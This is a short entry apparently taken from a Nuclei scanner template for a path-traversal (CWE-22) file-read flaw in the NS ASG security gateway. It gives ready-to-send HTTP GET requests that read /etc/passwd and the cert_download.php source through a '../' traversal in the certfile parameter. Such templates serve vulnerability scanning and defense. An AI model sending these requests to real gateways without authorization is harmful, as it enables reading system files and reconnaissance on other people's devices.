# Nuclei Template: NS ASG - Local File Inclusion
**Template ID:** nsasg-arbitrary-file-read
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`ns-asg-file-read.yaml`)

## Vulnerability Information & PoC

## Description
NS ASG is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd
GET {{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php
```

## References
- https://zhuanlan.zhihu.com/p/368054963
- http://wiki.xypbk.com/Web安全/网康%20NS-ASG安全网关/网康%20NS-ASG安全网关%20任意文件读取漏洞.md
